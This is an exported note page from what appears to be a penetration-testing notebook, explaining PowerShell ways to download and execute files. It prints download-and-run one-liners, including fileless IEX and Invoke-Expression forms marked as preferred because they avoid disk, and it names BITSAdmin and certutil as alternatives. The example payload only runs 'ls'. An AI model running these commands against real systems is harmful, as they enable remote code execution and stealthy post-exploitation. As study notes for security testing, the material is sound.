<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Download and execute file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Download and execute file</h1><br/><br />There are two primary ways we can download and execute code using PowerShell:<br />• <strong>download to disk</strong><br />   ◇ Powershell 2/3/4/5<br />      ▪ Net.WebClient DownloadFile method<br />         <div class="codebox"><div class="codebox">PS&gt;&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile(&quot;https://raw.githubusercontent.com/DenFox93/prova1/main/example.exe&quot;,&quot;$env:userprofile\desktop\fileprova.exe&quot;)<br />PS&gt;&nbsp;&amp;&nbsp;&#39;$env:userprofile\desktop\fileprova.exe&#39;&nbsp;&nbsp;&nbsp;&nbsp;#execute&nbsp;the&nbsp;file</div></div><br />      ▪ BITSAdmin.exe<br />      ▪ Certutil.exe w/ -urlcache argument<br />   ◇ Powershell 3/4/5<br />       <a href=""><img src="images/1074-1.png" alt="images/1074-1.png" /></a><br />       <div class="codebox"><div class="codebox">PS&gt;&nbsp;Invoke-WebRequest&nbsp;-Uri&nbsp;&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.exe&#39;&nbsp;-Outfile&nbsp;&#39;$env:userprofile\desktop\fileprova.exe&#39;<br />PS&gt;&nbsp;&amp;&nbsp;&#39;$env:userprofile\desktop\fileprova.exe&#39;&nbsp;&nbsp;&nbsp;&nbsp;#execute&nbsp;the&nbsp;file</div></div><br />•  download and run within the <strong>PowerShell process memory</strong>, and never touches the disk (Preferred Method)<br />   ◇ Powershell 2/3/4/5<br />       In “example.txt” there is the command “ls” because of that, the machine where we execute the command will list files and directories in the current folder<br />       <div class="codebox"><div class="codebox">PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.txt&#39;);</div></div><br />       <a href=""><img src="images/1074-2.png" alt="images/1074-2.png" /></a><br />   ◇ Powershell 3/4/5<br />       In “example.txt” there is the command “ls” because of that, the machine where we execute the command will list files and directories in the current folder<br />       <div class="codebox"><div class="codebox">PS&gt;&nbsp;(Invoke-WebRequest&nbsp;-Uri&nbsp;&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.txt&#39;).Content&nbsp;|&nbsp;Invoke-Expression</div></div><br />       <a href=""><img src="images/1074-3.png" alt="images/1074-3.png" /></a><br /><br />*For more examples go to the chapter <a href="Penetration_Testing--Penetration_Test_Methodology--Network_Pentest--Post_Exploitation--Maintain_Access--Download_files_from_Attacker-Web.html">Downloads files from Attacker/Web</a><br /><br /></div>
</body>
</html>
